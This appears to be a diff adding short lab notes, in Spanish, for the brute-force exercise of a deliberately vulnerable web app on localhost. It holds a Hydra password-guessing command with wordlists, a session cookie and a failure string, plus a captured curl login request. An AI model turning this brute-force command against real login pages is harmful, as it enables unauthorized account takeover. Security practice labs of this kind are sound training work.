@@ -1,0 +1,24 @@
+Comando hydra 
+ 
+hydra -L usernames.txt -P pass.txt "http-get-form://localhost:8080/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=79ekf0qur9ctid89nm3om8q102; security=low;:F=Username and/or password incorrect." -I
+
+
+Comando curl
+
+curl 'http://localhost:8080/vulnerabilities/brute/?username=admin&password=aaaaaa&Login=Login' \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+  -H 'Accept-Language: en-US,en;q=0.9' \
+  -H 'Connection: keep-alive' \
+  -H 'Cookie: PHPSESSID=kt7lfjlg8ootp0m907rsdmd490; security=low' \
+  -H 'Referer: http://localhost:8080/vulnerabilities/brute/?username=admin&password=passwordaaa&Login=Login' \
+  -H 'Sec-Fetch-Dest: document' \
+  -H 'Sec-Fetch-Mode: navigate' \
+  -H 'Sec-Fetch-Site: same-origin' \
+  -H 'Sec-Fetch-User: ?1' \
+  -H 'Upgrade-Insecure-Requests: 1' \
+  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36' \
+  -H 'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Linux"' \
+  --compressed
+
